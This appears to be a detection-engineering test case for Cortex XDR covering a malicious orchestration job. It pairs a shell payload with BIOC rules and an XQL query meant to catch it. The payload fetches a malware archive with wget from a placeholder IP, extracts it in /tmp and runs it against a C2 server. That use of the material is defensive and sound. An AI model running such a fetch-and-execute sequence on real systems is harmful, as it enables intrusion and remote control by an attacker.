identity.description: An attacker executes a malicious job via container orchestration tools like Kubernetes or Docker, attempting to gain persistence and command execution. Cortex should detect the suspicious process behavior and network activity associated with the job.

techniques.name: Command and Scripting Interpreter: Unix Shell

payload.code:
mkdir -p /tmp/extracted
wget -O /tmp/extracted/malware.tar.gz http://192.0.2.10/malware.tar.gz
chmod 755 /tmp/extracted/malware.tar.gz
ls -l /tmp/extracted/malware.tar.gz
tar -xzf /tmp/extracted/malware.tar.gz -C /tmp/extracted
chmod +x /tmp/extracted/malware
/tmp/extracted/malware --c2-server 192.0.2.50 --port 443

expected_artifacts.description: Execution of wget to download malware

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Suspicious Orchestration Job Execution
biocs.description: Detection of a process starting with download and execution of a binary in a temporary directory
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'wget' and action_process_image_name = '/tmp/extracted/malware'
| filter causality_actor_process_image_name = 'bash'

abiocs.name: Suspicious Temp Directory Job Execution
abiocs.description: Detection of process execution from a temporary directory with download and execution behavior
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name contains '/tmp/' and actor_process_image_name = 'wget'
| filter causality_actor_process_image_name = 'bash'

xql_queries.name: Orchestration Job Process Behavior
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name contains '/tmp/' and actor_process_image_name = 'wget'
| filter causality_actor_process_image_name = 'bash'
| comp count() as cnt by action_process_image_name, actor_process_image_name, causality_actor_process_image_name
